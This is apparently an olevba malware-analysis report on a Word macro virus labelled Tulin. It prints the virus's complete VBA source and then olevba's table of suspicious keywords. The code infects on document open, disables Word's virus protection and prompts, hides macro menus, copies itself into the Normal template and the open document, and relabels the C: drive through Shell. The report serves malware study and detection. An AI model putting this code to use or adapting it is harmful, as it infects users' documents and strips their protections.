olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tulin-31c32638c5630440c4b7a9d0a10d8fcb843d60d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO tulin.cls 
in file: Virus.MSWord.Tulin-31c32638c5630440c4b7a9d0a10d8fcb843d60d4 - OLE stream: 'Macros/VBA/tulin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Rem " Murat mgd "
Rem " this is for tulin "
On Error Resume Next

Application.EnableCancelKey = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0

CommandBars("Tools").Controls("Macro").Visible = 0
CommandBars("Tools").Controls("Templates and Add-Ins...").Visible = 0

inf_normal = False
inf_activ = False

If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "tulin" Then
   inf_normal = True
End If

If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "tulin" Then
   inf_activ = True
End If

If inf_normal <> True And inf_activ <> True Then
   GoTo vir_exit
End If

If inf_normal Then
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\mgd.sys"
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\mgd.sys")
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose()"
    NormalTemplate.VBProject.VBComponents.Item(1).Name = "tulin"
End If

If inf_activ Then
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\mgd.sys")
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
    ActiveDocument.VBProject.VBComponents.Item(1).Name = "tulin"
End If

vir_exit:

save_flag = False

If (Month(Date) = 2 And Day(Date) = 14) Or (Month(Date) = 9 And Day(Date) = 28) Or (Month(Date) = 11 And Day(Date) = 6) Then
    Selection.Paragraphs.Add
    Selection.Font.Bold = True
    Selection.Font.Size = 14
    Selection.TypeText Text:="You Give Your Heart Today Tomorrow and Forever "
    save_flag = True
End If

With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "my namber is 666"
    .Execute
End With

Shell ("label c:TULIN"), 0

If (inf_normal <> True And inf_activ = True) Or save_flag = True Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

